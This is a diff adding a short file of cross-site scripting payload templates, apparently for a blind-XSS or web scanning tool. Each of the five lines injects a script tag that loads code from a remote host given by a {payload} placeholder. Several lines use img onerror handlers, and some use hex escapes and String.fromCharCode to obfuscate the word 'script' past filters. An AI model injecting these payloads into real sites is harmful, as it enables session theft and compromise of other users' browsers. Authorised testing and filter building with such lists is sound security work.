@@ -1,0 +1,5 @@
+<script src=//{payload}></script>
+<script src=//{payload}>
+<img src=x onerror=with(document)body.appendChild(document.createElement('script')).src="//{payload}">
+<img/src=1 onerror="s=createElement('\x73\x63\x72\x69\x70\x74');body.appendChild(s);s.src='//{payload}'";>
+<img src=1 onerror="with(document)body.appendChild(createElement(String.fromCharCode(115,99,114,105,112,116))).src='//{payload}'";>
